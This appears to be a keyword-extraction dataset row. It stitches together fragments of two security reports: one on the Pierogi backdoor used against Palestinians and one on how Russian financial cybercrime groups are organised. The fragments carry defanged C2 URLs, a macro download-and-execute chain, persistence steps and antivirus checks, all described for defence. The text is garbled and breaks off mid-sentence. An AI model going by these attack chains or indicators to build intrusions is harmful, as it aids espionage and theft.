'RegAsm.exe', 'data', 'screenshots', '10', 'SMTP', 'PE'], 'target': 'Gorgon APT; emails; COVID-19; MSME sector; Exploit; CVE-2017-11882; code; ServerCrypted.vbs; The VBScript; PowerShell; command; first; injector DLL; second; Agent Tesla; memory; RegAsm.exe; data; screenshots; 10; SMTP; PE.'}"
the attackers; victims; an email; a report; the Middle East; topics; interest; the document; the victim; the malware; the victim; the decoy document; the victim; the backdoor; the victim; the backdoor; the attackers; Screenshots; the file; Figures; the screenshots; the victim; C2; data.,"["" 1. The attack starts with phishing emails containing weaponized documents as attachments. 2. The documents contain macros that download and execute a malicious loader executable. 3. The loader downloads the Pierogi backdoor executable and saves it to disk, such as C:\\ProgramData. 4. Pierogi adds a shortcut in the startup folder to achieve persistence. 5. Pierogi collects system information and communicates with a command and control server. 6. The C2 server can send Pierogi commands to further exploit the victim's machine. 7. Pierogi can exfiltrate data like screenshots back to the C2 server. ""]","Extract the keywords: 2/18/2020New Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi BackdoorNew Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi Backdoorcybereason.com/blog/new-cyber-espionage-campaigns-targeting-palestinians-part-2-the-discovery-of-the-new-mysterious-Research by: Cybereason Nocturnus Team Background Since December 2019, the Cybereason Nocturnus team has been investigating a campaign targeting Palestinian individuals and entities in the Middle East, mostly within the Palestinian territories. This campaign uses social engineering and decoy documents related to geopolitical affairs and relations between the Palestinian government, and references Egypt, Hezbollah, and Iran.Part one of this research investigates the Spark campaign, where attackers use social engineering to infect victims, mainly from the Palestinian territories, with the Spark backdoor. For more information about part one, click here.During the attacks, victims are infected with a previously undocumented backdoor, dubbed Pierogi by Cybereason. This backdoor allows attackers to spy on targeted victims. Cybereason suspects that the backdoor may have been obtained in underground communities rather than home-grown, as the evidence found in the code of the backdoor suggests it may have been developed by Ukranian-speaking hackers.The tactics, techniques, and procedures (TTPs), content, and theme of the decoy documents, as well as the victimology observed in the campaign, resemble previous attacks that have targeted Palestinians. In particular, these campaigns appear to be related to attacks carried out by a group called MoleRATs (aka, Gaza Cyber Gang, Moonlight), an Arabic-speaking, politically motivated group that has been operating in the Middle East since 2012. Key PointsCyber Espionage with a New Malware: The Cybereason Nocturnus team has discovered recent, targeted attacks in the Middle East to deliver the Pierogi backdoor for politically-driven cyber espionage. Targeting Palestinians: The campaigns seems to target Palestinian individuals and entities, likely related to the Palestinian government. Using Geopolitically-charged Lure Content: The attackers use specially crafted lure content to trick their targets into opening malicious ﬁles that infect the victim’s machine with the Pierogi backdoor. The decoy content of the malicious ﬁles revolves around various political affairs in the Middle East, speciﬁcally targeting the tension between Hamas and other entities in the region. Perpetrated by an Arabic-speaking APT, MoleRATs: The modus-operandi of the attackers as well as the social engineering decoy content seem aligned with previous attacks carried out by an Arabic-speaking APT group called MoleRATs (aka Gaza Cybergang). This group has been operating in the Middle East since 2012.For a synopsis of this research, check out the Molerats & Pierogis Threat Alert. Table of Contentsurl Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi BackdoorInfection Vector via Social Engineering Similar to previous attacks, this campaign starts with social engineering. In one instance, it lures victims to open an email attachment. In others, it persuades victims to download a report about a recent political affair pertaining to the Middle East and speciﬁcally to Palestinian matters. In most cases, the downloaded ﬁle is either an executable that masquerades as a Microsoft Word document or a weaponized Microsoft Word document.Malicious ﬁle named “Reports on major developments__347678363764”, uploaded to VirusTotal from the Palestinian territories.Backdoor Dropper File NameSHA-256347678363764_تا     ا   أ ل        .exe Translation: Report on major b7d81f9c48f5dd05e19d6ccdfaeb5Decoy Content As soon as the victim double-clicks on the dropper, they are presented with the decoy document. The document lowers the victim’s suspicions by distracting them with a real document while the dropper installs the backdoor. However, some of the documents also play an additional role in the attack. Whileurl Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi Backdoorsome are more neutral, quoting from newspapers and the media, others seem to report fake news to spread misinformation that serves a political agenda. With regards to decoy content themes, this campaign resembles previous campaigns reported in blogs by Vectra, Unit 42, and Talos. The contents of the decoy documents seems to include:Potentially fake documents that appear to be issued by the Palestinian government. Meetings minutes of different Palestinian organizations. News about Hamas and the Palestinian National Authority. Potentially fake, leaked Hamas documents. lations_‐ Jan-7.pdfLetter in the Di‐ port.docxDirectory of es in dif‐ ﬁle of a one?”)Select screenshots from the above decoy content:Excerpt of the decoy documents presented to the victims.url Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi BackdoorPotentially leaked Hamas document detailing expenses for Hamas 32th anniversary celebrations.In addition to the documents, the content includes a number of political cartoons that criticize Hamas’ relations with Iran and Hamas’ standing as a resistance movement.“#Iran Movement” - depicting the co-founder of Hamas, Mahmoud Al-Zahar and Ali Khamenei, the Supreme leader of Iran. Top: “The Speeches (calling for) ‘Resistance’” Bottom: “The reality” f1beee4fe9c4539Infection Vector: Analysis of the Malicious Word Documenturl Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi BackdoorWhile the majority of infections in this campaign did not originate from Malicious Microsoft Word documents, the Cybereason Nocturnus team found several weaponized Microsoft Word documents with an embedded downloader macro that downloads and installs the backdoor used in this attack.Malicious Microsoft Word Document uploaded from the Palestinian territories.Docu‐ 2020.docPhishing ContentSHA-256Resume of a woman from Abu-Dis, Palestinian fc7af370859b6f87c08840fA statement of the Ministry of Finance on civil and military employee beneﬁts and salaries, discussing the conterversial issue Palestinian Authority employ‐ ees that have not been paid or paid in full their 2e14ffe42e7d2e5b11ad80When the victims open the document, they are encouraged to click on Enable Content, which causes the embedded malicious macro code to run.url Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi BackdoorContents of the weaponized Microsoft Word document.The macro code embedded in the document is rather simple and is not obfuscated. In fact, it is almost unusual in its unsophistication.The macro code does the following:1. Downloads a Base64 encoded payload from the following URL:hxxp://linda-callaghan[.]icu/Minkowski/brown.2. Writes the decoded payload to C:\ProgramData\IntegratedOfﬁce.txt. 3. Decodes the Base64 payload and writes the ﬁle to C:\ProgramData\IntegratedOfﬁce.exe. 4. Runs the executable ﬁle and deletes the .txt ﬁle.url Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi BackdoorMalicious macro code found in the phishing document. Analysis of the Pierogi Backdoor Pierogi, the backdoor in this attack, appears to be a new backdoor written in Delphi. It enables the attackers to spy on victims using rather basic backdoor capabilities. While it is unknown at this point whether the backdoor was coded by the same members of the group behind the attacks, there are indications that suggest that the malware was authored by Ukranian-speaking malware developers. The commands used to communicate with the C2 servers and other strings in the binary are written in Ukrainian.This is why we chose to name the malware Pierogi, after the popular East European dish.url Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi BackdoorStrings embedded in the backdoor binary that show Ukranian words.The backdoor has the following capabilities:Collects information about the infected machine. Uploads ﬁles to the attackers’ server. Downloads additional payloads. Takes screenshots from the infected machine. Executes arbitrary commands via the CMD shell.In addition to spy features, the backdoor also implements a few checks to ensure it is running in a safe environment. Speciﬁcally, it looks for antivirus and other security products.1. The backdoor queries Windows for installed antivirus software using WMI: SELECT * FROMAntiVirusProduct2. It looks for speciﬁc antivirus and security products installed on the infected machine, such asKaspersky, eScan, F-secure and Bitdefender.url Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi BackdoorStrings of security products found in the backdoor code. Persistence Mechanism The backdoor achieves persistence using a classic startup item autorun technique:C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.2. Once the user logs on to the infected machine, the shortcut points to the ﬁle binary location in the1. A shortcut is added to the the startup folder:C:\ProgramData\ folder.The backdoor persistence shown via Sysinternals Autoruns tool.The GUID generated by the malware is saved in a ﬁle called GUID.bin. This ﬁle is created in the same folder as the binary of the backdoor (C:\ProgramData\GUID.bin).url Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi BackdoorContents of the GUID.bin ﬁle generated by the backdoor. C2 Communication by the Pierogi Backdoor The backdoor has rather basic C2 functionality implemented through a predeﬁned set of URLs:1. Sending machine information and a heartbeat to the C2: URL: hxxp://nicoledotson[.]icu/debby/weatherford/YortysnrThe information sent to the C2 includes:cname: computer name, username, and GUID av: Name of detected antivirus osversion: version of the operating system aname: the location of the malware on the infected machineSending basic information about the infected machineurl Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi Backdoor2. Requesting commands from the C2 server:URL: hxxp://nicoledotson[.]icu/debby/weatherford/EkspertyzaEkspertyza means expertise or examination in Ukranian. There are 3 basic commands coming from the the C2 server. For example, in some instances the backdoor uploads screenshots taken from an infected machine, as can be seen in the example below.url Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi BackdoorThe backdoor uploads a screenshot of the infected machine to the C2 server.4. Removing information:URL: hxxp://nicoledotso[.]icu/debby/weatherford/VydalytyVydalyty means to remove or delete in Ukrainian. The malware can delete various requests based on the command below.Excerpt from the code that handles deletion requests from the C2 server. Recent Infrastructure The records of the domains and IPs involved in this campaign seem to show that the attackers created a new infrastructure speciﬁcally for this campaign. The domains were registered in November 2019 and operationalized shortly after, as shown below.url Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi BackdoorPassiveTotal UI: An activity timeline of the malicious domain Linda-callaghan[.]icu.An activity timeline of the malicious domain Nicoledotson[.]icu. Conclusion In part two of this research, we examined the Pierogi campaign. Cybereason suspects this campaign targets Palestinian individuals and entities in the Middle East, speciﬁcally directed at those in the Palestinian government. The threat actors behind the campaign use social engineering to infect their victims with the Pierogi backdoor for cyber espionage purposes.The threat actor behind the attack invested considerable time and effort to lure their victims with specially-crafted documents that target Palestinian individuals and entities in the Middle East. In our analysis, we reviewed the TTPs and the decoy content, and pointed out the similarities between previous attacks that have been attributed to MoleRATs, an Arabic-speaking, politically motivated group that has operated in the Middle East since 2012.The Pierogi backdoor discovered by Cybereason during this investigation seems to be undocumented and gives the threat actors espionage capabilities over their victims. Based on the Ukranian language embedded in the backdoor, Cybereason raises the possibility that the backdoor was obtained in underground communities by the threat actors, rather than developed in-house by the group.Learn how to protect against these types of attacks with the right roles for SIEM and EDR. Download our white paper. Indicators of Compromise Click here to download the MoleRATs IOCs (PDF) MITRE ATT&CK BREAKDOWNInitial trationurl Cyber Espionage Campaigns Targeting Palestinians - Part 2: The Discovery of the New, Mysterious Pierogi BackdoorSpear Discoveryurl ","{'phrases': ['the attack', 'the documents', 'Downloads', 'the Pierogi Backdoor', 'C:\\ProgramData', 'a shortcut', 'the startup folder', 'persistence', 'information', 'the C2 server', 'commands', 'the victim', 'screenshots'], 'target': 'the attack; the documents; Downloads; the Pierogi Backdoor; C:\\ProgramData; a shortcut; the startup folder; persistence; information; the C2 server; commands; the victim; screenshots.'}"
the attackers; malware; use; intellectual property; the malware; money; the victim; malware; the victim; the stolen data; the person; the ransomware; money; the attacker; the malware; the victim; the infected system; the malware; the web; server; tools; communication; the malware; the system; system information; information; the victims; the network; system policies; the infected system; credit card data; the malware; the victim; the ransomware payload; the victim; the compromised system; the attacker; a scheduled task; the spoofed data; the malware; the victim; 10; the payload; use; a ransomware payload; the ransomware payload; the payload; a series of attacks; the infected system; 10; the malware.,[' 1. Exploration - Collecting information about the target company to develop a plausible social engineering scheme. 2. Infection - Infecting the corporate network via phishing emails with malicious attachments or links. Drive-by downloads can infect automatically. 3. Exploration and Implementation - Downloading remote access tools to gain system administrator credentials. 4. Money Theft - Accessing financial systems to initiate fraudulent money transfers or make purchases with stolen payment cards. '],"Extract the keywords: HOW IT WORKS.Ruslan Stoyanov, Head of Computer Incidents InvestigationRussian financial cybercrime: how it works.ContentsIntroduction 2 Situation overview 2 The structure of the Russian-language cybercriminal market 5 ""A Range of products and services"" 5 The “labor market"" of financial cybercrime 6 Options for organizing a criminal group 9 Distribution of roles in a large cybercriminal group 13 Virus writer/Programmer 13 Testers 14 Web designers and Web programmers 14 System administrators 15 Call services 16 Money flow managers 16 Head of Mules (Mule “project” leader) 17 Mule “projects” 17 Stages of the attacks 19 Conclusion 20 Reference. What is Kaspersky Lab Computer Incidents Investigation? 221Kaspersky LabRussian financial cybercrime: how it works.IntroductionThe Russian-language cybercrime market is known all over the world. By ‘Russian-language market’ we mean cybercriminals who are citizens of the Russian Federation and some former USSR countries, predominantly Ukraine and the Baltic states. Why is this market known worldwide? There are two main factors: the first of these is frequent global media coverage of the activity of Russian-language cybercriminals. The second is the open accessibility of online platforms used by the cybercriminal community for communications, promoting a variety of ""services"" and ""products"" and discussing their quality and methods of application, if not for making actual deals.Over time, the range of ""products"" and ""services"" available through this underground market has evolved, becoming more focused on financial attacks, and with an ever-increasing level of sophistication. One of the most common types of cybercrime was (and still is) the turnover of stolen payment card data. With the emergence of online stores and other services involving e-payment transactions, DDoS-attacks and financial cybercrime have become especially popular with the fraudsters whose main targets are users’ payment data or the theft of money directly from user accounts or companies.Attacks on users’ and companies’ e-wallets were initiated by the Trojan ibank in 2006; then came ZeuS (2007) and SpyEye (2009) followed by the groups Carberp (2010) and Carbanak (2013). And this list is incomplete; there are more Trojans out there, used by criminals to steal users’ money and data.With online financial transactions becoming more common, the organizations supporting such operations are becoming more attractive to cybercriminals. Over the last few years, cybercriminals have been increasingly attacking not just the customers of banks and online stores, but the enabling banks and payments systems directly. The story of the Carbanak cybergroup which specializes in attacking banks and was exposed earlier this year by Kaspersky Lab is a clear confirmation of this trend.Kaspersky Lab experts have been monitoring the Russian hacker underground since it first emerged. Kaspersky Lab regularly issues reports on financial cyber-threats which track changes in the number of financial malware attacks carried out over time. Information on the number of attacks may indicate the extent of the problem but does not reveal anything about who creates them and how. We hope that our review will help to shed light on this aspect of financial cybercrime.The data presented in this article is compiled from dozens of investigations that Kaspersky Lab experts have participated in over the last few years, as well as their many years’ experience observing the Russian cybercrime market.Situation overviewAccording to Kaspersky Lab, between 2012 and 2015, law enforcement agencies from a number of different countries, including the United States, Russia, Belarus, Ukraine and the EU arrested over 160 Russian-speaking cybercriminals who were members of small,2Kaspersky LabRussian financial cybercrime: how it works.medium-sized and large criminal groups. They were all suspected of being engaged in stealing money using malware. The total damage resulting from their worldwide activity exceeded $790 million dollars. (This estimate is based both on the analysis of public information about the arrests of people suspected of committing financial cybercrime in the period between 2012 and 2015 and on Kaspersky Lab’s own data.) Of this sum, about $509 million dollars was stolen outside the borders of the former USSR. Of course, this figure only includes confirmed losses, the details of which were obtained by law enforcement authorities investigation of more than 330 cybersecurity incidents. More than 95% of these were connected with the theft of money or financial information.Although the number of arrests of Russian-language criminals suspected of financial cybercrime increased significantly in 2015 compared with the previous year, the cybercriminal market is still ""crowded."" According to Kaspersky Lab experts, over the last three years Russian-language cybercrime has recruited up to a thousand people. These include people involved in the creation of infrastructure, and writing and distributing malware code to steal money, as well as those who either stole or cashed the stolen money. Most of those arrested are still not in prison.We can calculate fairly precisely the number of people who make up the core structure of an active criminal group: the organizers, the money flow managers involved in withdrawing money from compromised accounts and the professional hackers. Across the cybercriminal3Kaspersky LabRussian financial cybercrime: how it works.underground, there are only around 20 of these core professionals. They are regular visitors of underground forums, and Kaspersky Lab experts have collected a considerable amount of information that suggests that these 20 people play leading roles in criminal activities that involve the online theft of money and information.The exact number of groups operating across Russia and its neighboring countries is unknown: many of those involved in criminal activities participate in several thefts and then, for various reasons cease their activity. Some participants of known but apparently disbanded groups continue their criminal activities as part of new groups.Kaspersky Lab’s Computer Incidents Investigation Department can now confirm the activity of at least five major cybercriminal groups specializing in financial crimes. These are the groups whose activities have been monitored by the company's experts over the last few years.All five groups came to the attention of the company’s experts in 2012-2013, and are still active. They each number between ten and 40 people. At least two of them are actively attacking targets not only in Russia but also in the USA, the UK, Australia, France, Italy and Germany.Since the investigation into these groups has not been completed, it is not possible to publish more detailed information on the activities of these groups. Kaspersky Lab continues to investigate their activity and is cooperating with the law enforcement agencies of Russia and other countries in order to curb their cybercriminal business.Investigation into the activities of these groups has allowed Kaspersky Lab experts to form an idea about their methods of operation and the structure of the cybercriminal market.4Kaspersky LabRussian financial cybercrime: how it works.The structure of the Russian-language ""A Range of products and services""The cybercriminal market usually comprises a set of ""services"" and ""products"", used for various illegal actions in cyberspace. These ""products"" and ""services"" are offered to users of dedicated online communities, most of which are closed to outsiders.The “products” include:• Software designed to gain unauthorized access to a computer or a mobile device, inorder to steal data from an infected device or money from a victim’s account (the Trojans);• Software designed to take advantage of vulnerabilities in the software installed on avictim's computer (exploits);• Databases of stolen credit card data and other valuable information; •Internet traffic (a certain number of visits to a customer-selected site by users with a specific profile.)The “services” include:• Spam distribution; • Organization of DDoS attacks (overloading sites with requests in order to make themunavailable to legitimate users);• Testing malware for antivirus detection; •“Packing” of malware (changing malicious software with the help of special software (packers) so that it is not detected by antivirus software);• Renting out exploit packs; • Renting out dedicated servers; • VPN (providing anonymous access to web resources, protection of the dataexchange);• Renting out abuse-resistant hosting (hosting that does not respond to complaintsabout malicious content, and therefore does not disable the server);• Renting out botnets; • Evaluation of the stolen credit card data; • Services to validate the data (fake calls, fake document scans); • Promotion of malicious and advertising sites in search results (Black SEO); • Mediation of transactions for the acquisition of ""products"" and ""services""; • Withdrawal of money and cashing.Payments for such ""products"" and ""services"" on the cybercriminal market are generally made via an e-payment system such as WebMoney, Perfect Money, Bitcoin and others.5Kaspersky LabRussian financial cybercrime: how it works.All of these ""products"" and ""services"" are bought and sold in various combinations in order to enable four main types of crime. These types can also be combined in various ways depending on the criminal group:• DDoS attacks (ordered or carried out for the purpose of extortion); • Theft of personal information and data to access e-money (for the purpose of resaleor money theft);• Theft of money from the accounts of banks or other organizations; • Domestic or corporate espionage; • Blocking access to data on the infected computer for the purpose of extortion;According to Kaspersky Lab experts, the theft of money is currently the most widespread type of crime. The rest of this report therefore focuses on this segment of the Russian- language cybercrime market.The “labor market"" of financial cybercrimeThe variety of skills required for the creation of ""products"" and the provision of ""services"" has given rise to a unique labor market of professionals involved in financial cybercrime.The list of key roles is almost exactly the same as that seen in any IT-related company:• Programmers / encoders / virus writers (for the creation of new malicious softwareand modification of existing malware);• Web designers (for the creation of phishing pages, emails, etc.); • System administrators (for the construction and support of the IT infrastructure); • Testers (to test the malicious software); •“Cryptors” (responsible for the packing of malicious code to bypass antivirus detection).The list does not include the heads of the criminal groups, the money flow managers engaged in withdrawing money from compromised accounts, and the heads of money mules supervising the process of cashing the stolen money. This is because the relationship between these elements of the criminal groups is not an employer-employee one, but more of a partnership.Depending on the type and extent of the criminal enterprise, the heads of the groups either employ ""staff"" and pay them a fixed salary or work with them on a freelance basis paying for a particular project.6Kaspersky LabRussian financial cybercrime: how it works.An offer of employment posted on a semi-closed forum inviting a programmer to join a cybercriminal group. The job requirements include experience in writing complex bots.""Employees"" are recruited either via sites where those involved in criminal activity traditionally gather or via resources for those interested in non-standard ways of making money online. In some cases, the ads are placed on mainstream job search sites or on the labor exchanges for remote employees.In general, employees involved in cybercrime can be divided into two types: those who are aware of the illegality of the project or the work they are offered, and those who (at least in the beginning) know nothing about it. In the latter case, these are usually people performing relatively simple operations such as copying the interface of banking systems and sites.By advertising ""real"" job vacancies, cybercriminals often expect to find employees from the remote regions of Russia and neighboring countries (mostly Ukraine) where problems with employment opportunities and salaries for IT specialists are quite severe.7Kaspersky LabRussian financial cybercrime: how it works.A fraudster has advertised a job vacancy for java / flash specialists on a popular Ukrainian website. The job requirements include a good level of programming skills in Java, Flash, knowledge of JVM / AVM specifications, and others. The organizer offers remote work and full employment with a salary of $2,500.The idea of searching for ""employees"" in these regions is simple – they carry a saving because staff can be paid less than employees based in large cities. Criminals also often give preference to candidates who have not previously been involved in cybercrime activity.Often, such job offers are presented as legitimate work, with the true purpose of the work only becoming clear once the task is received.8Kaspersky LabRussian financial cybercrime: how it works.In this example, the organizer of the criminal group offers a job to a javascript programmer, masking it under a vacancy at a ""Web-innovation studio specializing in the development of highly sophisticated Internet applications.""In the case of illegal job search sites, less-experienced candidates are expected.This vacancy invites a C ++ developer to develop ""custom"" software. In this context ""custom"" software means malicious software.The second reason in favor of remote ""personnel"" is the organizer’s aim of making the activity of the group as anonymous as possible, and to ensure that no single contractor possesses complete information about the group.Options for organizing a criminal groupCriminal groups involved in stealing money or financial information that will enable them to get access to money, differ in the number of participants and scope of activities. There are three main types of involvement:• Affiliate programs • Single dealers, small and middle-sized groups (up to ten members) • Large organized groups (ten or more participants)This division is nominal. The scale of the group’s activity depends on the skillfulness of its participants, their ambition and the overall level of organizational abilities. In some cases, Kaspersky Lab experts came across relatively small criminal groups performing tasks that usually require a greater number of participants.9Kaspersky LabRussian financial cybercrime: how it works.Affiliate programs Affiliate programs are the easiest and least expensive method of getting involved in cybercrime activities. The idea behind an affiliate program is that the organizers provide their ""affiliates"" with almost all the tools they need to commit a crime. The task of the ""affiliates"" is to generate as many successful malware infections as possible. In return, the owner or owners of the affiliate program share the income received as a result of these infections with the affiliates. Depending on the type of fraudulent scheme this could be a share of:• The sums stolen from the accounts of Internet banking users; • The money paid by the user as a ransom when cybercriminals use ransomwareTrojans;• The money stolen from the ""prepaid"" accounts of mobile device users by sending outSMS messages to premium mobile numbers with the help of a malicious program.Creating and supporting an affiliate program for the purpose of stealing money is a cybercrime committed, as a rule, by a group of users. However, such projects are often carried out by large organized groups whose activity is analyzed later in this document.This advertisement announces the launch of the beta testing of an affiliate program used to distribute encrypting ransomware. Judging by its characteristics, the group's activity is focused on companies located in the US and the UK. This is indicated by the comment saying that the malware distributed via the partner network is able to encrypt files with 80 different extensions, many of which are files of applications used in companies. The text on requirements for candidates to participate in testing includes a demonstration of the presence of traffic or downloads from the United States and the United Kingdom.According to Kaspersky Lab experts, affiliate programs are becoming less popular with Russian-language cybercriminals. The main driver of their popularity had been fraudulent schemes used to infect users’ mobile devices with malicious programs which then sent out SMS messages to premium numbers. However, in the spring of 2014, the Russian regulator introduced new requirements for the organization of such services, which included a need to secure additional confirmation of subscription to a particular paid mobile service. This change10Kaspersky LabRussian financial cybercrime: how it works.was instrumental in reducing the number of malicious mobile partner programs to practically zero. Nevertheless, this type of joint cybercriminal activity is still used by groups specializing in the distribution of encrypting ransomware.Small Groups What distinguishes this form of cybercriminal activity from an affiliate program is that in this instance the criminal or criminals organize their own fraudulent scheme. Most of the components needed for the attack, such as malware and its modifications (""re-packed"" malware), the traffic, the servers, etc., are bought on the black market. Often, members of such groups are not experts in the field of computer and network technologies; they learn about the components and organization of financial attacks from public sources, usually forums. The abilities of such groups can be restricted by a number of factors. Specifically, the use of widely-available malware results in rapid detection by security solutions. This, in turn, makes cybercriminals invest more money in the distribution of malware and in its ""re- packing"" to bypass detection. The end result is a significant drop in profits for the attacker.Mistakes made by this type of cybercriminal often result in their identification and arrest. However, as a relatively low cost entry into the world of cybercriminal activity (from $ 200), this ""amateur"" format continues to attract new dealers.An example of such an ""amateur"" criminal organization is the group that in 2012 was convicted by the Russian court for stealing more than 13 million rubles (then worth about $422,000) from a Russian bank’s online customers. During a comprehensive investigation Kaspersky Lab experts were able to collect the information that allowed law enforcement authorities to identify those behind the theft.The court sentenced two members of the criminal group, giving each a suspended sentence of four and a half years. However, this verdict did not stop the criminals, and they continued to commit crimes, stealing almost as much again over the next two and a half years. They were re-arrested in May 2015.Large organized criminal groups Large criminal groups differ from the other players, both through a larger scale of activity and through a more thorough approach to the organization and operation of criminal schemes. Such groups can comprise up to several dozen people (not including money mules used for cashing and ""laundering"" money.) The targets of their attacks are not limited to individual online banking customers: they also attack small and medium-sized companies, while the largest and most sophisticated of them, such as Carbanak focus mostly on banks and e- payment systems.The operational structure of large groups differs significantly from smaller groups. To a certain extent, the structure reflects that of an ordinary, average-sized company engaged in software development.In particular, large groups have some form of regular staff - a group of associates who perform organizational tasks in return for a regular, fixed payment. However, even in these large, professional groups some of the tasks are passed to third-party contractors. For example, the ""re-packing"" of malware can be performed by the staff or hired virus writers or11Kaspersky LabRussian financial cybercrime: how it works.via third-party services where the process is automated with the help of special software. The same is true for many other elements of the IT infrastructure required for committing crime.Examples of large, organized criminal groups are Carberp, whose members were arrested in Russia and Ukraine in 2012 and 2013 respectively, and Carbanak, unmasked by Kaspersky Lab in early 2015.Although the damage from the activity of partner programs and small groups can run into hundreds of thousands of dollars, the large criminal groups are the most dangerous and destructive. The estimated damage caused by Carberp reaches several hundred million dollars (up to a billion). In this regard, studying how these groups function and the tactics they use is extremely important, as it strengthens our ability to effectively investigate their activity and - ultimately - to suppress it.12Kaspersky LabRussian financial cybercrime: how it works.Distribution of roles in a large cybercriminal groupA major financial cybercrime undertaken by criminal “experts” in security and the finance sector can result in multi-million dollar losses for attacked organizations. As a rule, such crimes are preceded by many months of preparation. This preparation includes constructing complex infrastructure, and selecting and developing malicious software, as well as a thorough study of the target organization in order to clarify the details of its internal operations and security vulnerabilities. Each member of the criminal group has their own responsibilities.The composition of middle-sized and large criminal groupsThe following role distribution is typical for a criminal group involved in stealing money. The distribution of roles in groups that specialize in other types of cybercrime may be different.Virus writer/Programmer A virus writer or programmer is responsible for creating malicious programs, i.e. the programs that allow the attackers to gain a foothold in the corporate network of the target organization, download additional malware that will help to obtain the necessary information, and ultimately steal money.13Kaspersky LabRussian financial cybercrime: how it works.The significance of this group member and the nature of their relationship with the organizers may vary from group to group. For example, if the group uses ready-made malware taken from open sources or bought from other virus writers, their functions may be limited to setting and modifying malicious programs to work in the infrastructure created specifically for a certain cybercrime, or to adapt it for attacks on specific institutions. The most advanced groups, however, tend to rely on their own ""developments"" since it makes a malicious program less visible to most security solutions and provides more opportunities for malware modification. Where this is the case, the virus writer’s role becomes more important as they are responsible for the architecture and feature set of a malicious program.A virus writer can also take on responsibility for malware ""re-packing"". But this happens only when the organizer wants to keep the maximum number of tasks within the group, and where original software is used for malware ""re-packing"". In most cases, however, this procedure is shifted to third-party contractors or packing-services.Testers The function of testers in a criminal group is not that different from testers working in legal IT companies. In both cases, testers receive from their managers the specifications for testing programs in different environments (different versions of operating systems, different sets of installed applications, etc.) and execute them. If a fraudulent scheme involves fake interfaces of remote banking or e-payment systems, the task of testers also includes monitoring the correct operation of these fakes.Web designers and Web programmers Typically, web designers and web programmers are remote employees, whose tasks include creating phishing pages and websites, fake application interfaces and web injects, all of which are used to steal data to get access to e-payment and e-banking system.Distributors Distributors aim to ensure the download of malicious software on as many devices as possible. The result is achieved by using several tools. Generally, the group organizer determines the profile of the users to be infected and buys the required type of traffic from the so-called traffic providers (services to attract users with certain characteristics to a particular website).14Kaspersky LabRussian financial cybercrime: how it works.An advert offering to buy traffic. Cybercriminals are willing to pay only for the successful installation of malicious software at $ 140 per 1000 ""call-backs"" (a message that is sent by the malware to the command server after a successful infection).The organizer can choose and order a spam mailing that will contain either an infected attached file or a link taking a victim to a malicious website. The organizers can also choose the site with the necessary target audience; involve hackers in breaking into it and placing the exploit pack on it. Of course, all these tools can be used in combination with each other.Hackers Often, in the course of an attack, the exploits and other malicious software the organizer has to hand is not enough to infect all the computers necessary for the attack and to anchor in them. It may become necessary to hack into a specific computer or site. In such cases, the organizers involve hackers, people who have considerable skills in information security and are able to perform non-standard tasks. In many of the cases examined by Kaspersky Lab experts, hackers were occasionally involved and were paid on a fee-for-service basis. However, if hacking is required regularly (e.g., for targeted attacks on financial institutions), a hacker becomes a “team member” and is often one of the cybercriminal group’s key participants, along with the organizers and money flow managers.System administrators System administrators in cybercriminal groups perform near-identical tasks to their counterparts in legitimate businesses: they implement the IT infrastructure and maintain it in working condition. Cybercriminal system administrators configure management servers, buy abuse-resistant hostings for servers, ensure the availability of tools for anonymous connection to the servers (VPN) and resolve other technical challenges, including the interaction with remote system administrators hired to perform small tasks.15Kaspersky LabRussian financial cybercrime: how it works.Call services Social engineering is important for the success of the cybercriminal business. Especially when it comes to attacks on organizations that result in the theft of huge sums of money. In most cases, even if the attackers are able to establish control over the computer from which the transaction could be performed, confirmation of its legitimacy is required to successfully complete the operation. This is what the ""call service"" is for. At the specified time, its ""employees"" play the role of an employee of the attacked organization or a bank with which the organization works, and confirm the legitimacy of the transaction.""Call services"" can participate in a particular cybercrime both as a subdivision of the criminal group, or as a third-party organization, performing a specific task on a fee-for-service basis. The forums that users involved in cybercrime use to communicate with each carry plenty of ads offering such services.This advertisement offers “call services"" in English, German, Dutch and French. The group specializes in calls to Internet stores and banks, as well to duped mules. Also, the group offers the quick creation of local toll-free numbers used to imitate support services in fraudulent schemes, receiving SMS messages, and receiving and sending faxes. The criminals ask from $10 to $12 for one call, $ 10 for receiving SMS and from $ 15 for creating toll-free numbers.According to Kaspersky Lab, large cybercriminal groups prefer to have their own “call services” so they hardly ever turn to third-party providers.Money flow managers Money flow managers are members of the cybercriminal group who come into play when all the technical tasks for organizing the attack (choosing and infecting the target and anchoring in its infrastructure) are fulfilled, and everything is ready to commit the theft. Money flow managers are the people who withdraw money from compromised accounts. However, their participation is not limited to pressing the keys; they play a key role in the whole process.Money flow managers usually thoroughly understand the internal rules of the attacked organization (they even know the lunch hours of the employee from whose computer the fraudulent transaction will be made). They know how the automated anti-fraud systems operate and how to bypass them. In other words, in addition to their criminal role of thieves,16Kaspersky LabRussian financial cybercrime: how it works.money flow managers perform ""expert"" tasks that are difficult or impossible to automate. Perhaps because of this special status, money flow managers are one of the few members of the criminal group who receive a percentage of the stolen money rather than a fixed ""salary"".Money flow managers often perform as botnet operators. i.e. members of the criminal group who analyze and classify the information obtained from infected computers (the access to the remote banking services, availability of money on the accounts which could be accessed, the organization where the infected computer is located, etc.).Besides money loaders, these “working conditions” are only shared by the leaders of mule 